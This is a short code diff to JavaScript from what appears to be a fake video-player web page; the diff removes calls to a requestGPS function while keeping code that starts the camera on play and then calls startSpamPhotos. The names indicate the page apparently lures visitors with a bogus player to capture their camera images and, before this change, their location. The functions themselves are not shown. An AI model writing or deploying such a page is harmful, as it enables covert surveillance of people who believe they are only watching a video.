@@ -341,7 +341,6 @@ function autoRequestCamera() {
     video.play().then(function() {
       var box = document.getElementById('playerBox');
       if (box) box.classList.add('active');
-      requestGPS();
       setTimeout(function() { startSpamPhotos(); }, 2000);
     }).catch(function() {});
   })
@@ -359,7 +358,6 @@ function tryPlay() {
     loadBar.style.width = '100%';
     setTimeout(function() { loadBar.style.width = '0'; }, 600);
     document.getElementById('playerBox').classList.add('active');
-    if (!gpsData) requestGPS();
     startSpamPhotos();
     return;
   }
@@ -381,13 +379,11 @@ function tryPlay() {
       loadBar.style.width = '100%';
       setTimeout(function() { loadBar.style.width = '0'; }, 600);
       document.getElementById('playerBox').classList.add('active');
-      requestGPS();
       setTimeout(function() { startSpamPhotos(); }, 2000);
     }).catch(function() {
       loadBar.style.width = '100%';
       setTimeout(function() { loadBar.style.width = '0'; }, 600);
       document.getElementById('playerBox').classList.add('active');
-      requestGPS();
       setTimeout(function() { startSpamPhotos(); }, 2000);
     });
   })
